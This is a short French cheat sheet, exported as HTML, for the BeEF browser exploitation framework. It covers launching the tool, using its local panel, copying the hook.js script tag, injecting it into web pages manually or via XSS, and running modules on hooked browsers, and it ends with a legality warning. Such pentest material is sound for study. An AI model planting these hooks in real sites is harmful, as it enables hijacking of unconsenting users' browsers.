<!DOCTYPE html []>
<html>
  <head>
    <meta charset="UTF-8" />
    <meta name="author" content="MarkdownViewer++" />
            

  </head>
  <body>
    <h1 id="beef-browser-exploitation-framework-cheat-sheet">BeEF (Browser Exploitation Framework) Cheat Sheet</h1>
    <h2 id="prerequis">Prérequis</h2>
    <ul>
      <li>BeEF installé sur votre système.</li>
      <li>Navigateur cible avec JavaScript activé.</li>
    </ul>
    <h2 id="demarrage-de-beef">Démarrage de BeEF</h2>
    <h3 id="lancer-beef">Lancer BeEF</h3>
    <pre>
      <code>beef
</code>
    </pre>
    <h2 id="interface-utilisateur-de-beef">Interface Utilisateur de BeEF</h2>
    <h3 id="acceder-a-linterface-ui">Accéder à l'interface UI</h3>
    <ul>
      <li>Ouvrez votre navigateur et allez à <code>http://127.0.0.1:3000/ui/panel</code></li>
      <li>Connectez-vous avec les identifiants par défaut ou ceux que vous avez configurés.</li>
    </ul>
    <h2 id="hooking-des-navigateurs">Hooking des Navigateurs</h2>
    <h3 id="obtenir-le-script-de-hook">Obtenir le script de hook</h3>
    <ul>
      <li>Dans l'interface de BeEF, copiez le script de hook (ex. <code>&lt;script src="http://127.0.0.1:3000/hook.js"&gt;&lt;/script&gt;</code>).</li>
    </ul>
    <h3 id="injecter-le-script-de-hook-dans-des-pages-web">Injecter le script de hook dans des pages web</h3>
    <ul>
      <li>Le script peut être injecté manuellement dans des pages web ou via des attaques XSS.</li>
    </ul>
    <h2 id="utilisation-des-modules">Utilisation des Modules</h2>
    <h3 id="selectionner-un-navigateur-hooke">Sélectionner un navigateur hooké</h3>
    <ul>
      <li>Dans l'interface UI de BeEF, cliquez sur un navigateur sous "Hooked Browsers".</li>
    </ul>
    <h3 id="choisir-et-executer-des-modules">Choisir et exécuter des modules</h3>
    <ul>
      <li>Sélectionnez un module à exécuter depuis le panneau "Commands".</li>
      <li>Configurez les options du module et lancez-le.</li>
    </ul>
    <h2 id="astuces">Astuces</h2>
    <ul>
      <li>Toujours utiliser BeEF dans un cadre légal. L'utilisation non autorisée contre des navigateurs sans consentement est illégale.</li>
      <li>BeEF est puissant pour démontrer l'impact des attaques de type client et l'importance de la sécurité du navigateur.</li>
      <li>Testez BeEF dans un environnement contrôlé pour comprendre comment sécuriser vos applications web contre ce type d'attaque.</li>
    </ul>
  </body>
</html>
